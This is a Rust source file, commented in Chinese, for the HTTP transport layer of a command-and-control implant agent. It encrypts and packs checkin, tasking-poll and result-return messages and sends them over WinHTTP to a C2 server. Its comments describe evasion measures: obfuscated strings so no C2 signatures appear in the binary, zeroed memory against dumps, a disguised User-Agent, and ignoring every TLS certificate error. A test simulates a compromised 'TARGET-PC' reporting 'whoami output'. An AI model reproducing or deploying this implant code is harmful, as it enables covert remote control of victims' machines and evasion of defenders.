//! # HTTP 通信 Profile 编排与发包适配器 (HTTP Profile & Transport Adapter)
//!
//! ## 架构核心哲学与 100% 零堆契约 (Zero-Heap OPSEC Architecture)
//!
//! 1. **Caller-Provided Buffer 模式**：
//!    - 所有序列化、AES 加密与 Base64 编码均在调用者提供的外部栈/静态缓冲区（`raw_buf` 与 `out_b64`）中就地完成；
//!    - 彻底杜绝动态堆分配与高频内存申请，有效规避 Windows 10/11 Segment Heap 碎片与取证追踪。
//! 2. **编译期敏感特征抹除 ([`obfstr`])**：
//!    - HTTP 请求动作、默认请求头、状态码与路径全部采用 [`obfstr::obfstr!`] 宏加密；
//!    - 编译生成的 Release 二进制中绝不在 `.rdata` 留下任何明文 C2 特征。
//! 3. **全链路物理刷零 (Zero-Remanence)**：
//!    - 封包发送完毕或遇到任何错误时，立即调用 [`zeroize_slice`] 物理刷零临时二进制缓冲区，阻止内存转储嗅探。

use crate::buffer::zeroize_slice;
pub use crate::error::HttpError;
use crate::profiles::crypto::{CryptoContext, MAX_PLAINTEXT_LEN};
pub use crate::profiles::crypto::{MAX_B64_LEN, MAX_RAW_LEN};
#[allow(deprecated)]
use crate::protocol::{
    CheckinMessage, GetTaskingMessage, PostResponseMessage,
    ServerCheckinResponse, ServerTaskingResponse, ServerTaskingResponseRef,
};
use obfstr::obfstr;

/// HTTP Profile 协议打包与网络传输协议管理器
pub struct HttpProfile<'a> {
    /// C2 服务器地址或域名 (如 "http://127.0.0.1:8080")
    pub server_url: &'a str,
    /// HTTP POST 请求 URI 路径 (如 "/api/v1/post")
    pub post_uri: &'a str,
    /// 当前活跃 Agent UUID (36 字节，初始为 PayloadUUID，上线后切换为 CallbackUUID)
    pub uuid: &'a str,
    /// 密码学上下文管理器
    pub crypto_ctx: &'a CryptoContext,
}

impl<'a> HttpProfile<'a> {
    /// 创建一个新的 HttpProfile 实例
    #[inline]
    pub fn new(
        server_url: &'a str,
        post_uri: &'a str,
        uuid: &'a str,
        crypto_ctx: &'a CryptoContext,
    ) -> Self {
        Self {
            server_url,
            post_uri,
            uuid,
            crypto_ctx,
        }
    }

    /// 纯字节切片直接封包加密 (零堆分配管道)
    ///
    /// * `data`: 待加密发送的原始明文切片 (不得超过 MAX_PLAINTEXT_LEN)
    /// * `raw_buf`: caller 提供的二进制字节缓冲区 (建议 `>= MAX_RAW_LEN`)
    /// * `out_b64`: caller 提供的 Base64 输出缓冲区 (建议 `>= MAX_B64_LEN`)
    /// * 返回: 写入 `out_b64` 的实际 Base64 字节长度
    #[inline(never)]
    pub fn pack_bytes(
        &self,
        data: &[u8],
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        if data.len() > MAX_PLAINTEXT_LEN {
            return Err(HttpError::BufferOverflow);
        }
        self.crypto_ctx
            .seal_message(data, self.uuid, raw_buf, out_b64)
            .map_err(|_| HttpError::CryptoSealFailed)
    }

    /// 通用结构体序列化并封包加密 (100% 纯栈零堆分配管道)
    #[inline(never)]
    pub fn pack_message<T: serde::Serialize>(
        &self,
        msg: &T,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        // 纯栈就地序列化缓冲 (2960 字节，远小于 Windows 4KB 页面，不触发 __chkstk，零堆分配)
        let mut json_buf = [0u8; MAX_PLAINTEXT_LEN];
        let mut cursor = std::io::Cursor::new(&mut json_buf[..]);
        if serde_json::to_writer(&mut cursor, msg).is_err() {
            zeroize_slice(&mut json_buf);
            return Err(HttpError::BufferOverflow);
        }
        let json_len = cursor.position() as usize;

        let res = self.pack_bytes(&json_buf[..json_len], raw_buf, out_b64);
        zeroize_slice(&mut json_buf[..json_len]);
        res
    }

    /// 通用 Base64 密文解包解密并反序列化为指定类型 (零拷贝借用)
    #[inline(never)]
    pub fn unpack_message<'de, T: serde::Deserialize<'de>>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<T, HttpError> {
        let plaintext_len = self
            .crypto_ctx
            .open_message(payload_b64, raw_buf)
            .map_err(|_| HttpError::CryptoOpenFailed)?;

        let plaintext_slice = &raw_buf[..plaintext_len];
        let deserialized: T = serde_json::from_slice(plaintext_slice)
            .map_err(|_| HttpError::JsonDeserializeFailed)?;

        Ok(deserialized)
    }

    // ----------------- 常用消息构建与解析快捷通道 -----------------

    /// 构建初始上线注册 (Checkin) 请求报文
    #[inline]
    pub fn build_checkin_payload(
        &self,
        checkin_msg: &CheckinMessage<'_>,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        self.pack_message(checkin_msg, raw_buf, out_b64)
    }

    /// 解析服务端下发的 Checkin 注册回执
    #[inline]
    pub fn parse_checkin_response<'de>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<ServerCheckinResponse<'de>, HttpError> {
        let resp: ServerCheckinResponse<'de> = self.unpack_message(payload_b64, raw_buf)?;
        resp.validate().map_err(|_| HttpError::ServerResponseError)?;
        Ok(resp)
    }

    /// 构建心跳轮询拉取任务 (GetTasking) 请求报文
    #[inline]
    pub fn build_get_tasking_payload(
        &self,
        tasking_msg: &GetTaskingMessage<'_>,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        self.pack_message(tasking_msg, raw_buf, out_b64)
    }

    /// 解析服务端下发的心跳响应指令报文 (零拷贝借用切片)
    #[inline]
    pub fn parse_tasking_response<'de>(
        &self,
        payload_b64: &[u8],
        raw_buf: &'de mut [u8],
    ) -> Result<ServerTaskingResponseRef<'de>, HttpError> {
        let resp: ServerTaskingResponseRef<'de> = self.unpack_message(payload_b64, raw_buf)?;
        if resp.action != obfstr!("get_tasking") {
            return Err(HttpError::ServerResponseError);
        }
        Ok(resp)
    }

    /// 解析服务端下发的心跳响应指令报文 (自持有结构体)
    #[inline]
    #[allow(deprecated)]
    #[deprecated]
    pub fn parse_tasking_response_owned(
        &self,
        payload_b64: &[u8],
        raw_buf: &mut [u8],
    ) -> Result<ServerTaskingResponse, HttpError> {
        let resp: ServerTaskingResponse = self.unpack_message(payload_b64, raw_buf)?;
        if resp.action != obfstr!("get_tasking") {
            return Err(HttpError::ServerResponseError);
        }
        Ok(resp)
    }

    /// 构建任务执行回执与结果回传 (PostResponse) 请求报文
    #[inline]
    pub fn build_post_response_payload(
        &self,
        response_msg: &PostResponseMessage<'_>,
        raw_buf: &mut [u8],
        out_b64: &mut [u8],
    ) -> Result<usize, HttpError> {
        self.pack_message(response_msg, raw_buf, out_b64)
    }

    /// 创建 Windows 原生 WinHTTP Keep-Alive 传输调度器
    #[cfg(windows)]
    pub fn create_winhttp_transport(
        &self,
        server_host: &str,
        server_port: u16,
        is_https: bool,
        user_agent: &str,
    ) -> Result<winhttp::WinHttpTransport, HttpError> {
        winhttp::WinHttpTransport::new(server_host, server_port, is_https, user_agent)
    }
}

// ==========================================
// Windows 原生 WinHTTP Keep-Alive 传输调度器
// ==========================================

#[cfg(windows)]
pub mod winhttp {
    use super::*;

    type HInternet = *mut core::ffi::c_void;

    const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
    const WINHTTP_FLAG_SECURE: u32 = 0x00800000;

    #[link(name = "winhttp")]
    unsafe extern "system" {
        fn WinHttpOpen(
            pszAgentW: *const u16,
            dwAccessType: u32,
            pszProxyW: *const u16,
            pszProxyBypassW: *const u16,
            dwFlags: u32,
        ) -> HInternet;

        fn WinHttpConnect(
            hSession: HInternet,
            pswzServerName: *const u16,
            nServerPort: u16,
            dwReserved: u32,
        ) -> HInternet;

        fn WinHttpOpenRequest(
            hConnect: HInternet,
            pwszVerb: *const u16,
            pwszObjectName: *const u16,
            pwszVersion: *const u16,
            pwszReferrer: *const u16,
            ppwszAcceptTypes: *mut *const u16,
            dwFlags: u32,
        ) -> HInternet;

        fn WinHttpSendRequest(
            hRequest: HInternet,
            lpszHeaders: *const u16,
            dwHeadersLength: u32,
            lpOptional: *const core::ffi::c_void,
            dwOptionalLength: u32,
            dwTotalLength: u32,
            dwContext: usize,
        ) -> i32;

        fn WinHttpReceiveResponse(hRequest: HInternet, lpReserved: *mut core::ffi::c_void) -> i32;

        fn WinHttpQueryDataAvailable(
            hRequest: HInternet,
            lpdwNumberOfBytesAvailable: *mut u32,
        ) -> i32;

        fn WinHttpReadData(
            hRequest: HInternet,
            lpBuffer: *mut core::ffi::c_void,
            dwNumberOfBytesToRead: u32,
            lpdwNumberOfBytesRead: *mut u32,
        ) -> i32;

        fn WinHttpCloseHandle(hInternet: HInternet) -> i32;

        fn WinHttpSetOption(
            hInternet: HInternet,
            dwOption: u32,
            lpBuffer: *const core::ffi::c_void,
            dwBufferLength: u32,
        ) -> i32;

        fn WinHttpQueryHeaders(
            hRequest: HInternet,
            dwInfoLevel: u32,
            pwszName: *const u16,
            lpBuffer: *mut core::ffi::c_void,
            lpdwBufferLength: *mut u32,
            lpdwIndex: *mut u32,
        ) -> i32;
    }

    const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31;
    const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x00000100;
    const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x00002000;
    const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x00001000;
    const SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE: u32 = 0x00000200;
    const SECURITY_FLAGS_IGNORE_ALL_CERT_ERRORS: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
        | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
        | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
        | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE; // 0x3300

    const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
    const WINHTTP_QUERY_FLAG_NUMBER: u32 = 0x20000000;

    /// Windows 原生 WinHTTP 复用会话客户端 (基于 TCP Keep-Alive)
    pub struct WinHttpTransport {
        session: HInternet,
        connect: HInternet,
        is_https: bool,
    }

    struct RequestHandle(HInternet);

    impl Drop for RequestHandle {
        fn drop(&mut self) {
            if !self.0.is_null() {
                unsafe {
                    WinHttpCloseHandle(self.0);
                }
            }
        }
    }

    impl WinHttpTransport {
        /// 初始化会话并建立 Keep-Alive 连接池
        ///
        /// * `server_host`: 目标服务器 IP 或域名 (如 "127.0.0.1")
        /// * `server_port`: 目标端口 (如 80, 443, 8080)
        /// * `user_agent`: 伪装 User-Agent
        pub fn new(
            server_host: &str,
            server_port: u16,
            is_https: bool,
            user_agent: &str,
        ) -> Result<Self, HttpError> {
            let mut host_w = [0u16; 256];
            let mut ua_w = [0u16; 256];

            encode_utf16(server_host, &mut host_w)?;
            encode_utf16(user_agent, &mut ua_w)?;

            unsafe {
                let session = WinHttpOpen(
                    ua_w.as_ptr(),
                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                    core::ptr::null(),
                    core::ptr::null(),
                    0,
                );
                if session.is_null() {
                    return Err(HttpError::NetworkTransportFailed);
                }

                let connect = WinHttpConnect(session, host_w.as_ptr(), server_port, 0);
                if connect.is_null() {
                    WinHttpCloseHandle(session);
                    return Err(HttpError::NetworkTransportFailed);
                }

                Ok(Self {
                    session,
                    connect,
                    is_https,
                })
            }
        }

        /// 通过已建立的 Keep-Alive 管道发送 POST 请求并接收回执 (纯切片就地传输与 RAII 自动资源释放)
        ///
        /// * `uri`: POST 路径 (如 "/api/v1/post")
        /// * `payload`: 待发送的已封包 Base64 字节切片
        /// * `out_buf`: 用于接收服务端响应的输出缓冲区
        /// * 返回: 写入 `out_buf` 的有效字节长度
        pub fn post_exchange(
            &self,
            uri: &str,
            payload: &[u8],
            out_buf: &mut [u8],
        ) -> Result<usize, HttpError> {
            let mut uri_w = [0u16; 256];
            let mut verb_w = [0u16; 16];
            encode_utf16(uri, &mut uri_w)?;
            encode_utf16(obfstr!("POST"), &mut verb_w)?;

            let flags = if self.is_https { WINHTTP_FLAG_SECURE } else { 0 };

            let h_raw = unsafe {
                WinHttpOpenRequest(
                    self.connect,
                    verb_w.as_ptr(),
                    uri_w.as_ptr(),
                    core::ptr::null(),
                    core::ptr::null(),
                    core::ptr::null_mut(),
                    flags,
                )
            };
            if h_raw.is_null() {
                return Err(HttpError::NetworkTransportFailed);
            }
            // RAII 守卫：无论任何分支退出或发生异常，离开作用域均自动关闭 request 句柄，杜绝句柄泄漏
            let request = RequestHandle(h_raw);

            // 当开启 HTTPS 时，显式忽略所有 CA 证书异常 (自签名/域名不匹配/过期)，保证免受 CA 校验失败阻断
            if self.is_https {
                let mut sec_flags: u32 = SECURITY_FLAGS_IGNORE_ALL_CERT_ERRORS;
                unsafe {
                    WinHttpSetOption(
                        request.0,
                        WINHTTP_OPTION_SECURITY_FLAGS,
                        &mut sec_flags as *mut _ as *const core::ffi::c_void,
                        core::mem::size_of::<u32>() as u32,
                    );
                }
            }

            unsafe {
                let send_res = WinHttpSendRequest(
                    request.0,
                    core::ptr::null(),
                    0,
                    payload.as_ptr() as *const core::ffi::c_void,
                    payload.len() as u32,
                    payload.len() as u32,
                    0,
                );
                if send_res == 0 {
                    return Err(HttpError::NetworkTransportFailed);
                }

                let recv_res = WinHttpReceiveResponse(request.0, core::ptr::null_mut());
                if recv_res == 0 {
                    return Err(HttpError::NetworkTransportFailed);
                }

                // 校验 HTTP 响应状态码，非 200 立即熔断，防止 404/500 HTML 报错页面进入解密逻辑
                let mut status_code = 0u32;
                let mut status_size = core::mem::size_of::<u32>() as u32;
                let query_res = WinHttpQueryHeaders(
                    request.0,
                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    core::ptr::null(),
                    &mut status_code as *mut _ as *mut core::ffi::c_void,
                    &mut status_size,
                    core::ptr::null_mut(),
                );
                if query_res == 0 || status_code != 200 {
                    return Err(HttpError::ServerResponseError);
                }

                let mut total_read = 0;
                loop {
                    let mut bytes_avail = 0u32;
                    if WinHttpQueryDataAvailable(request.0, &mut bytes_avail) == 0 || bytes_avail == 0 {
                        break;
                    }

                    if total_read + (bytes_avail as usize) > out_buf.len() {
                        return Err(HttpError::BufferOverflow);
                    }

                    let mut bytes_read = 0u32;
                    let read_res = WinHttpReadData(
                        request.0,
                        out_buf[total_read..].as_mut_ptr() as *mut core::ffi::c_void,
                        bytes_avail,
                        &mut bytes_read,
                    );
                    if read_res == 0 {
                        return Err(HttpError::NetworkTransportFailed);
                    }
                    total_read += bytes_read as usize;
                }

                Ok(total_read)
            }
        }
    }

    impl Drop for WinHttpTransport {
        fn drop(&mut self) {
            unsafe {
                if !self.connect.is_null() {
                    WinHttpCloseHandle(self.connect);
                }
                if !self.session.is_null() {
                    WinHttpCloseHandle(self.session);
                }
            }
        }
    }

    #[inline]
    fn encode_utf16(src: &str, dst: &mut [u16]) -> Result<(), HttpError> {
        let mut idx = 0;
        for c in src.encode_utf16() {
            if idx + 1 >= dst.len() {
                return Err(HttpError::BufferOverflow);
            }
            dst[idx] = c;
            idx += 1;
        }
        dst[idx] = 0;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profiles::crypto::{MAX_B64_LEN, MAX_RAW_LEN};
    use crate::protocol::TaskResponseItem;

    #[test]
    fn test_http_profile_roundtrip_all() {
        let master_key = b"01234567890123456789012345678901";
        let uuid = "12345678-1234-1234-1234-1234567890ab";
        let crypto_ctx = CryptoContext::new(master_key).unwrap();

        obfstr::obfstr! {
            let server_url = "http://127.0.0.1:8080";
            let post_uri = "/api/v1/post";
        }

        let profile = HttpProfile::new(
            server_url,
            post_uri,
            uuid,
            &crypto_ctx,
        );

        let ips = ["192.168.1.50"];
        let checkin_msg = CheckinMessage::new(
            uuid,
            &ips,
            "Windows 11",
            "Administrator",
            "TARGET-PC",
            4321,
            "x64",
            "WORKGROUP",
        );

        let mut raw_buf = [0u8; MAX_RAW_LEN];
        let mut b64_buf = [0u8; MAX_B64_LEN];

        // 1. 打包加密
        let b64_len = profile
            .build_checkin_payload(&checkin_msg, &mut raw_buf, &mut b64_buf)
            .unwrap();
        assert!(b64_len > 0);

        // 2. 模拟服务端解密并验证原结构
        let mut server_raw_buf = [0u8; MAX_RAW_LEN];
        let plain_len = profile
            .crypto_ctx
            .open_message(&b64_buf[..b64_len], &mut server_raw_buf)
            .unwrap();
        let plain_str = core::str::from_utf8(&server_raw_buf[..plain_len]).unwrap();
        assert!(plain_str.contains("\"action\":\"checkin\""));
        assert!(plain_str.contains(uuid));
        assert!(plain_str.contains("\"ips\":[\"192.168.1.50\"]"));

        // 3. Post Response 测试
        let item = TaskResponseItem::new("task-uuid-123", "whoami output", true);
        let items = [item];
        let resp_msg = PostResponseMessage::new(&items);

        let post_b64_len = profile
            .build_post_response_payload(&resp_msg, &mut raw_buf, &mut b64_buf)
            .unwrap();
        assert!(post_b64_len > 0);

        let mut server_post_raw = [0u8; MAX_RAW_LEN];
        let post_plain_len = profile
            .crypto_ctx
            .open_message(&b64_buf[..post_b64_len], &mut server_post_raw)
            .unwrap();
        let post_str = core::str::from_utf8(&server_post_raw[..post_plain_len]).unwrap();
        assert!(post_str.contains("\"action\":\"post_response\""));
        assert!(post_str.contains("whoami output"));
    }
}
